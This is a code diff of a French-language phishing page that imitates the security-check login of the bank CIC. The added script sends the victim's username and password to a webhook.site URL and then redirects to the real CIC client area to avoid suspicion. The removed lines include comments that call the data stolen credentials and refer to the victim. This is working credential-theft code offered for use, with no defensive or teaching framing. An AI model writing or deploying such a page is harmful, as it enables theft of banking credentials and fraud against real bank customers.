@@ -1,55 +1,19 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification CIC</title>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background-color: #0056b3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
-        button:hover { background-color: #004494; }
-        .logo { margin-bottom: 15px; font-weight: bold; color: #0056b3; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo">CIC - Sécurité</div>
-        <p>Vérification de sécurité requise</p>
-        <form id="loginForm">
-            <input type="text" id="username" name="username" placeholder="Identifiant" required>
-            <input type="password" id="password" name="password" placeholder="Code secret" required>
-            <button type="submit">Valider</button>
-        </form>
-    </div>
-
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
             
-            // 🔽 REMPLACE L'URL CI-DESSOUS PAR TON WEBHOOK GITHUB ACTION 🔽
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // 🔽 TON WEBHOOK URL ICI 🔽
             const webhookUrl = 'https://webhook.site/aa3ef8a4-4344-45c9-ae08-8302184367b8'; 
-            // Note : Pour faire simple, on va utiliser un service gratuit comme webhook.site ou github actions.
-            // Voici la méthode la plus simple sans serveur :
             
-            // Méthode 1 : Envoi vers un service de logging gratuit (pour tester)
-            // fetch('https://webhook.site/TON_ID_UNIQUE?user=' + user + '&pass=' + pass);
-            
-            // Méthode 2 (Recommandée) : Envoi vers ton email via un service gratuit comme "Formspree" ou "Webhook.site"
-            // Pour l'instant, on va utiliser une méthode qui affiche les données dans la console du navigateur de la victime
-            // ET on essaie de les envoyer via un lien de redirection.
-            
-            alert('Vérification en cours...');
-            
-            // Simulation d'envoi
-            console.log('Identifiants volés : ' + user + ' / ' + pass);
-            
-            // Redirection vers la vraie page CIC pour ne pas éveiller les soupçons
-            window.location.href = 'https://www.cic.fr';
+            // Envoi des données à toi
+            fetch(webhookUrl + '?user=' + encodeURIComponent(username) + '&pass=' + encodeURIComponent(password))
+                .then(() => {
+                    // Redirection vers la vraie page CIC pour la forme
+                    window.location.href = 'https://www.cic.fr/espace-client';
+                })
+                .catch(error => console.error('Erreur:', error));
         });
     </script>
-</body>
-</html>
